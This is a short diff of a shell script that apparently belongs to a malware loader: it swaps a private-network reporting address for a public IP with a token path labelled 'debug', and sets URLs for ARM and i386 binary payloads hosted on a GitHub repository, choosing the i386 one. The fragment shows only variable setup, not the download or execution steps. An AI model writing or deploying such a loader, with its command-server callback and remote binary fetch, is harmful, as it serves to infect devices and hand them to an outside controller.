@@ -1,6 +1,6 @@
 #!/bin/sh
 
-report_url="http://192.168.1.187:19088/9024134B28978B68666E2B034E46130E/debug"
+report_url="http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug"
 arm_url="https://raw.githubusercontent.com/gptloveyou/learn/main/armv5.bin"
 intel_url="https://raw.githubusercontent.com/gptloveyou/learn/main/i386.bin"
 pl_url=$intel_url;
